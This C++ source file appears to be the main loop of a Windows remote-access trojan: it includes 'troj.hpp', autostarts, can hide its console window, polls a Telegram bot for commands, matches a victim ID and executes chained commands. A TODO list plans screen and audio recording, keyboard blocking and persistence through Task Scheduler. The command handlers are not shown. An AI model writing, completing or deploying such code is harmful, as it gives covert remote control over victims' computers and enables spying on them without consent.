#include <iostream>
#include <string>
#include <fstream>
#include <time.h>
#include <sstream>
#include <nlohmann/json.hpp> //I used json cause propably in developing dupnix i will use it
#include <cpr/cpr.h>
#include <opencv2/opencv.hpp>
#include "troj.hpp"
#include "commands.hpp"

using namespace cv;
using namespace std;
using json = nlohmann::json;

constexpr int REFRESH = 5; //in seconds
constexpr bool AUTOSTART = 1; 
constexpr bool HIDE_TERMINAL = 0;

int main() {
	if(AUTOSTART) autostart();
	if(HIDE_TERMINAL) ShowWindow(::GetConsoleWindow(), SW_HIDE);
	startup();

	int last(-1); 	fstream file;
	file.open("last", ios::in);
	file >> last;
	file.close();

	while (true) {
		Sleep(REFRESH * 1000);
		json message = GetLastMessage();

		if (last == message["message_id"]) continue; //continue if that request is already done
		if (time(nullptr) - message["date"] > REFRESH + 3) continue; //continue if that request is too old

		last = message["message_id"].get<int>();
		file.open("last", ios::out);
		file << last;
		file.close();
		
		string id = "", command = "", parameters = "";
		string parse = message["text"];
		if (parse == "ALL_ID") {
			cout << "ALL_ID\n";
			Send(ID);
			continue;
		}
		queue<pair<string, string>> Q;
		for (int i = 0, it = 0; i < parse.size(); i++)
		{
			if (parse[i] == ' ') {
				it++; if(it <= 2)continue;
			}

			if (parse.size() - i > 4) {
				if (parse[i - 1] == ' ' && parse[i] == '&' && parse[i + 1] == '&' && parse[i + 2] == ' ') {
					Q.push({ command, parameters.substr(0,parameters.size()-1)});
					command.clear(); parameters.clear();
					it = 1;
					i += 2; continue;
				}
			}

			if (it == 0)id += parse[i];
			if (it == 1)command += parse[i];
			if (it > 1)parameters += parse[i];

		}
		Q.push({ command, parameters });

		if (id.empty())continue;
		bool done = true;
		if (ID == id) { 
		    cout << "ID passed, command: " + parse.substr(id.size()+1, TELEGRAM_MAX) << endl;
			while (!Q.empty()) {
				if (Q.front().first.empty()) continue;
				if (Q.front().second.empty())Q.front().second = "NULL";
				commands(Q.front().first, Q.front().second);
				Q.pop();
			}
		}
	}
}

/*
* TODOLIST
-autostart using task sheduler (easy admin acess)
-custom autostart path
-make a handler for turing off
-sth like math() for math stuff like in py interpreter
-recording screen for some time
-recording audio for some time
-block keyboard
                        //////WHEN EVERYTHING UPPER WILL BE DONE THEN IT'S VERSION 3.0
*/